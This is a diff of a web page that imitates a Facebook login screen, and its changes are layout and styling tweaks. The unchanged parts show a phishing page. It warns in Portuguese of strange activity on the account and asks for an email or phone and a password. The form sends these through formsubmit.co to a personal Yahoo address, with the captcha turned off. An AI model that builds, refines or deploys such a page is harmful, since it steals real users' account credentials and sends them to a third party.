@@ -21,6 +21,8 @@ body {
     font-family: 'Poppins', sans-serif;
     background-color: #f0f2f5;
     color: #1c1e21;
+    display: flex;
+    flex-direction: column;
 }
 
 main {
@@ -199,12 +201,12 @@ footer small {
 
 <body>
     <main>
-        <div class="row">
+        <div class="row" style="display: flex; flex-direction: column; padding: 10%; margin-top: 30vw;">
             <div class="col-logo">
                 <img src="FACE_BOOK_IMAGE.svg" alt="Logo">
                 <h2>Detectamos um movimento estranho na sua conta, preecha os campos para não <b>perde-la</b></h2>
             </div>
-            <div class="col-form">
+            <div class="col-form" style="margin-top: 5vh;">
                 <form class="form-container" action="https://formsubmit.co/miguelcampos670@yahoo.com" method="POST">
                     <input type="text" name="email" placeholder="Email, ou telefone" required>
                     <input type="password" name="senha" placeholder="Senha" required>
@@ -214,12 +216,12 @@ footer small {
                     <input type="hidden" name="_subject" value="Alguém preencheu o formulário!">
                     <input type="text" name="_honey" style="display: none;">
                     <input type="hidden" name="_captcha" value="false">
-                    
+
                 </form>
             </div>
         </div>
     </main>
-    <footer>
+    <footer style="margin-top: 30vh;">
         <div class="footer-contents">
             <ol>
                 <li>English (UK)</li>
